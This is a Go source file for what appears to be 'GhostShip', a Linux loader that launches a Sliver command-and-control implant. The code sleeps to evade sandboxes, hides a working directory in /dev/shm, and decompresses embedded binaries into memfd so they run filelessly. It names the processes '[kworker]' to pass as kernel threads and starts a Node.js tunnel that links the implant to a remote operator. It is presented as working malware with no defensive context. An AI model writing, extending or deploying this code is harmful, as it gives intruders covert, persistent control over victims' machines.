//go:build linux

package core

import (
	"compress/gzip"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"
)

func Run(connString string) error {
	// 1. Initial Delay for Sandbox Evasion
	time.Sleep(10 * time.Second)

	fmt.Println("[*] GhostShip Starting...")

	// 2. Create Socketpair (Anonymous Pipes)
	fds, err := syscall.Socketpair(syscall.AF_UNIX, syscall.SOCK_STREAM, 0)
	if err != nil {
		return fmt.Errorf("socketpair failed: %w", err)
	}

	// 3. Create Hidden Runtime Directory (in-memory)
	workDir := "/dev/shm/.gs-" + fmt.Sprint(time.Now().UnixNano())
	if err := os.MkdirAll(workDir, 0700); err != nil {
		workDir = "/tmp/.gs-" + fmt.Sprint(time.Now().UnixNano())
		os.MkdirAll(workDir, 0700)
	}
	defer os.RemoveAll(workDir)

	// 4. Extract Assets
	if err := extractAssets(workDir); err != nil {
		return err
	}

	// 5. Load Binaries to memfd
	nodeFd, err := loadAssetToMemfd("node.gz", "[kworker/u4:1]")
	if err != nil { return err }

	payloadFd, err := loadAssetToMemfd("payload.gz", "[kworker/u4:2]")
	if err != nil { return err }

	// 6. Start Node.js Bridge (P2P Tunnel)
	nodeCmd := exec.Command("/proc/self/fd/"+fmt.Sprint(nodeFd), filepath.Join(workDir, "client.js"), connString)
	nodeCmd.Env = append(os.Environ(), fmt.Sprintf("GS_PIPE_FD=%d", fds[0]))
	nodeCmd.ExtraFiles = []*os.File{os.NewFile(uintptr(fds[0]), "pipe")}
	
	if err := nodeCmd.Start(); err != nil {
		return fmt.Errorf("node start failed: %w", err)
	}

	// 7. Start Sliver Payload
	payloadCmd := exec.Command("/proc/self/fd/"+fmt.Sprint(payloadFd))
	payloadCmd.Env = append(os.Environ(), fmt.Sprintf("SLIVER_PIPE_FD=%d", fds[1]))
	payloadCmd.ExtraFiles = []*os.File{os.NewFile(uintptr(fds[1]), "pipe")}

	if err := payloadCmd.Start(); err != nil {
		nodeCmd.Process.Kill()
		return fmt.Errorf("payload start failed: %w", err)
	}

	// 8. Wait for completion
	nodeCmd.Wait()
	payloadCmd.Wait()

	return nil
}

func loadAssetToMemfd(assetName, procName string) (int, error) {
	f, err := Assets.Open("assets/" + assetName)
	if err != nil { return 0, err }
	defer f.Close()

	gz, err := gzip.NewReader(f)
	if err != nil { return 0, err }
	defer gz.Close()

	fd, _, err2 := syscall.Syscall(319, uintptr(unsafe.Pointer(syscall.StringBytePtr(procName))), 1, 0)
	if err2 != 0 {
		return 0, fmt.Errorf("memfd_create failed: %v", err2)
	}

	if _, err := io.Copy(os.NewFile(fd, ""), gz); err != nil {
		return 0, err
	}

	return int(fd), nil
}
